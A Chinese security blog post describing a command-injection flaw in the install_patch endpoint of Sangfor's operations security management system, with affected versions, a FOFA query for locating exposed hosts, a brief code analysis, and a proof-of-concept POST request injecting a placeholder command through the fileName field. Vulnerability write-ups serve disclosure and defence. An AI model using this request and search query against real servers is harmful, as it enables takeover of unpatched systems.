---
title: "深信服运维安全管理系统 install_patch 远程命令执行漏洞"
source: https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html
asset_dir: assets/深信服运维安全管理系统-install_patch-远程命令执行漏洞
---

# 深信服运维安全管理系统 install\_patch 远程命令执行漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2026/3/11 08:41
- 119浏览
- [0评论](#comment)
- 6分钟阅读

深入探索

SQL注入防护

Docker加速服务

安全研究工具

---

# 漏洞简介

深信服运维安全管理系统 install\_patch 接口存在远程[命令执行](https://mrxn.net/tag/rce)漏洞。攻击者可通过构造恶意的请求，利用该漏洞在目标服务器上执行任意命令，从而可能导致服务器被完全控制、敏感数据泄露等严重后果。影响范围包括所有运行存在该漏洞版本的深信服运维安全管理系统的服务器。

文件大小转换

# 影响版本

低于 3.0.12 20241106

# fofa语法

> body="/fort/login" && header="FORTSESSIONID"

# 漏洞分析

看下 `com.sbr.fort.web.controller.system.concentrationManagement.NodePatchController#delPatch`的实现逻辑

[![深信服运维安全管理系统 install_patch 远程命令执行漏洞](images/img-001-93daa1b18215.webp)](https://image.mrxn.net/b99833148d1944c2b9d4c23b1af6a9ff.webp)

参数 `fileName` 直接拼接进 **cmd** 中进行[命令执行](https://mrxn.net/tag/rce),从而造成[命令注入](https://mrxn.net/tag/rce)漏洞。

深入探索

在线安全工具

服务器安全服务

防火墙软件

# 漏洞复现

[![深信服运维安全管理系统 install_patch 远程命令执行漏洞](images/img-002-95edf58edb9c.webp)](https://image.mrxn.net/4c6f5f6e3a4f4370a520ceda847556a4.webp)

## POC

```
POST /fort/system;help/concentration_management/install_patch HTTP/1.1
Host: sangfor_osm.mrxn.net
Content-Type: application/x-www-form-urlencoded

fileName=123;RCE_POC
```

[![深信服运维安全管理系统 install_patch 远程命令执行漏洞](images/img-003-78cfdf09a6c6.webp)](https://image.mrxn.net/df4a1a5e878a4adc876148925fe9c72c.webp)

访问命令执行结果重定向文件，成功获取到[命令执行](https://mrxn.net/tag/rce)结果。

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#0day](https://mrxn.net/tag/0day)
- [#rce](https://mrxn.net/tag/rce)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)
- [5.1.POC](#toc-5-1-)

  
  

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAANK0lEQVR4Aeyb0XbcSA5Dc+f//3nXEH27WeyS7HgysR+0xwhIEKSUopS2vWf++fXr1/9+F/9r/7O3SUeo/hk+GjZ/2GvpKrcmzx512bocvcc9n3pqHdY79/rvxFnIr7dBn8Lb4A+/gF/Aw+dsBXNZPQwcvVAcLYDrPJ7dvJ2uD9aZ0eMPEgeJO6J1WIN1lnq4+6/ieINjIQlu/IwTWBYCtWlY+TO3CtXjUzB7pg7ln77k02suxxPMPJqAdb5eKH3mgK0PBrZvrAZnmF8xrLOg8tmzLGQW7/zvn8AfW4hPC+w3f/ZXS5+1xIG5DDUTiuMJet1YTj0wl6MFULO6DqvWa+kxh/JBcWoBoOXL/McW8uU7uBuXE/hXCwEe350tU9+SPDEBcPnvMDzrb22XX5kXwLMHOHqA4zpH8vYHrPmbtHxlTkeK5rD2QuVQrC89HdF7/pX4Xy3kKxe8e65PYFlINrzD2Yh4oZ4aPdGCs3zq3Qs1C4pT64DSdzP0WZOhemDP+v5r9v4mz+suC5nFL+d345dP4FgI7J8eWPV5FXh+hkB59cCaq8vwWvfp0SNDea/qeuXpPcuhZqcPKj7zxnMF4KUMHJ9tcM02Hgsxufn7T+Afn4bf4X7bUJvvWo9hX/d68RrD6oXrPL1B+sMdUL2pBbDPe48xrF51GdY6PHM9ueZXcL8hnuAP4WUhUJuG4nmPUDoUpz6fgmg76INnrz5YNb3WzWV1qD54srWP2FkyPD8P1ZwBNd/cOpQ+cygdsOXxOfIQToJjIcDRoMcLmEPV1eXUoWqwcmpB9/Ycyt+1xFeA6jmbGf2qPzWoGVAcLUgvlAbF0YPUgsQBrPVoQTwTsPdC6bDysZAMu/EzTuAfeL6qZ7fk1mHdZvfrka1B9cxcH2DpP2WvNy8CHP86AI/S9AKHR4N1GZ51qBiKZw+s+qzfb4gn8kN4WYgbn/cGtdVZNw/PnmgdsM6AZz574VnLDDjyxy8yoXL7AMOHRwE4nm4ozrwzzB7zyVCzoHjWk89rQHmnHm8AVV8WksKN7z2B4wdDqO14K7DmbhVWXX9nWD2wz53Ze41nzRzWWd1vPNleGdYZUDkwWx9vlgVnmMs7HXj0A1oXDZ66M+435HFUPyM4vsuat+K2gGWj6voBw4dPD3BoD8N7YP09PQjKO2tQ+mF6+8O6/CadfumBmgHF6rvGq1r365OhZnePsR5ZXVaHmnG/IZ7MD+FjIXNLUNua9wil608dXrXoonvVPstnvXB9zcyH8iTeAV7rUNq8rjlU3Xnwmus986hPn/qxEJObv/8EjoVAbdqtyd6euQyvfr1QNfPJ8Fp3rl549aQGpZ/5oepA7FsAx2ebM3ZsozWoHnWo3Lp656ta90HNUjsWYnLz95/A8XOItwG1LSieW4ZVh8rhyc6aveoyVI9559kL5VWHyq96em0XQ83gnbsHqta1xF5fhvKZh+PriBZ07Sq+35Cr0/mG2rGQbHAH7wfWJ0H9qkcPVK+5bK95GFYvXOfpCTILVm+0IPUgcZB4B+AhxxcoJA7MgeVzSD0MVYOVUwsyJ0gcJO44FgL75jR0wMc+h0N5zZ1jDlWPDs94l0cL7JWh+oCUt5he82mODhwHbQ0qh2L1eANzqDq8/l8Z8QXw9AC2vvCxkBf1Fr7tBC4XAixPTDbdkbuG1QNrHs8Ozkmtx7s82kdwhgx1H1B81t/9PYbXpx3WWVC5fbkGrBpUnloH7PXLhfQBd/x3TmD7y0Wo7fXN53ag9MQBEFpgjwwcb9nMl6b3RM97+iB1qFkW1MNqUJ5oO+jbMVSvNVjzqTsfXn2wanqdccb3G3J2Mt+kLz8Ynt2D25X1JTeG9YlQjyc4y6PD2gtrHs9HgOrJtQKo/KM+6+kRah8x1DXsu2Io75wJpUPx/YbME/oz+ZenbD9D5jSo7cEr+1TYA6tn6jOH53czUL3OlGHV54zkv+ONfwfYX2fn3WlQ/fBkfd7fR/n9hnhCP4QvP0OgNu29zi2r7/gjr/Uw1HUSB1D5bm40qHq8wU6D8qQWxBfAqqf2EdK3w+yLZ2rmUNeNJ1BPHEDV7zfEk/kh/KnPEO8VaovmYXjVogtY6/Ca650M5c0TFEDl+qByQOn4mQdeP5cehvcg8wLg0fNeeuSpB+ofMfBiAY55FqByKFbPdYL7DfFEfggvnyHZUDDvLdoO8aknDs5ydRnWJyS9Qo8Me6/1zs6AfY912V7zzlAzYM/2QtXTqzY5tQ7r8OxN/X5Dcgo/CMtCoLbl9uZ9QtWn3nO49kDVd9eAqjkPKtcrW5cBw08zsPzb3hvPrqMuQ80w7zOgal1LvPNGh/IfH+pnphg7dj6oQfqmB6oOxfpk/Z2hvGpQuT2T45vaWR5vYB1qdjRhbTKUd+q7/GwW7GfoX96QOfjO//4JbBcC6xahclg5t+tm5WgBlHfqqXUAPf2tGDj+2YEnzwFeH8pjXd18x9NzlsNzNlQMKzt/zlCH8m8Xounmv38Cx0KgtjMv7zavePaY2wM121yGp24PPLX41BMHV/lZDWqmdVjzrvcYMP005x4nbFYHlrdaXT4WYtPN338C24W4LVi3CZVf3TaUB4r1wpp7jdShampQORTHcwV4/qrkzOds67DOTh1KSxzAPofSodiZn+HM7Zg924VM053/vRM4fnXixrws7Dc/ffo765ncPYmhrgHPpxtKS30HqDoU68m1jGGtqX/EwMMCHP/OZ24AlT8MJwHwqADLDAtQOuz5fkM8qR/Cx0/qUNvynvJU7ACrDyoHbD2eCuDBFpwHVes6lKan16LBWo/WAdjy8t+pPwongXNSNpaj7XBVB46/++yD0q960/MNb0gue+PsBI6FuDV5mmHdLlQe3+wxl6G8UKwuAxlzie6FV3/qDgAun1B9k/uMXe2z9fg6YL0fWHO9XvNYiMnN338Cx0KgtgYrz9uDqk89Oaw1qHw+AVB6en4X/2aWvZP7PcD+3mDVYZ9nNqy1Pj9xPB1QfrVjITHe+Bkn8FsLcYtXtw7rxqHy2QNP3bnw1OKHfQ6l29e9XYtuDtUDxakFsOZnWnRnydECc3j+TBX9M7BX77GQKZpD3exZHh1Wj4OhdPN4O9TDUN5e73E8gVriAKov8cT0msuw9gJzxPHNAZwfsrNeGjfC9ALHfK1Q+bEQxZu//wSOX51AbcctQuXeHlQ+64CWB+t5CO8BcDwRUKwv/G5Z6lA+wPKjnp7gUXgLkgdv4fIFHH2L+JbEe4a38vIFNQOKl+JbAqVn3lu6fEULFOHpjQ6VW7/fEE/ih/DlQrLBDli3+Zmaf8/uTawOGL782iO+ADie8sTBo+E9AH69hy8Uf/BSGMLvzIi3I/ODjOx64mg7pBbM2uVCpvnO//sTOH65mO0G2ViQOEjcEa0jt2dd3Ty1DvXJ8dibOPgojyeYvmhnmNedee9zrqy3exJ/VI/HXjlaYK8cLbjfkJzCD8LxXZb347bcprl19c561GZur/rMo9s7Wa9s3VzODOPJsyfeM9hrj3zmn/Xkzpg8Z5zV7zdknsw358dCstkOt+m9me/YPr1nrM8Z5vGrJQ7Mu6friTviM0/coS5bm3l0Na8vpxZYTxzs6mqTZ6/55GMhU7zz7zuB47ssL+9Ws/3PIH32yPaZx7ODdf1hfYmD6Zl18/iM5WjBzKMFUzfvnHsI4g8SB4kDvYkD8x2nL7CWODCX7zfEk/ghvHyXlY0F2fYVvPd4e5zcvsSBdTlah/6wnsSBPvXJu3r6Ar2JA/NdT2rxWJN//UrliXiCWTfvNbVn9z7SJ99vyP6cvk09FpLNdriteVc7Xc1+e2auLn9Uj0+PHG0H72HH+q2dzUp91sxTC5wlRwt6biynHpg78yw/FmJRnk1T73XjXDTQe8Y7f/qCWYvWMWfq7zw9M+/zejx9u1z/rHn96MaTU+uwPmduF9Ib7/jvnsDxba9b+izvbtGNz9rUvYa+5HoSB+aTUwvslXeavakFemXrneML1PR+hTMn+Gyv17zfkM+e2F/yHQtxOx/xvKf4p2aep6NDXU6vmFrv67G+yZkztZnHE0zdPNcxPuP0B7Oe3qDr8QVd28XxBOkPjoXsjLf2PSewLCQb2uFP3FqegmA3y2tai69DfbJ9nafHOerm9qh3njV79JhPTt3eyal1nNWXhfSGO/7vTuBq8r9aSLbs8MSBuU+PeWqBudy1xIE1ec4yv+LMCZyRuMNe652tdX/i7ulxakHXnNG1xPEFs27+rxaSC9z4syfwxxeS7QfeppuX1eMJkluTowepBYkD69EmUu/Qq6Zf3VxWD88ePfJZPb1ietRlZ8n6//hCvMDNXzuBZSFub/LZ6PjOam7c+szTG6RuTY62g3VZT/LM6rB2xuk5Q5+T2Bn6owXqO069w1559uhdFjJNd/73T+BYiFv7iK9uzw3rMXemuazvis96ndHrxpP1eh3rU09dTY+cWmA9cYd6/OqJO/TI+iYfC5ninX/fCfwfAAD//7q0/V0AAAAGSURBVAMAndMYy/gqWh8AAAAASUVORK5CYII=)

手机扫码阅读
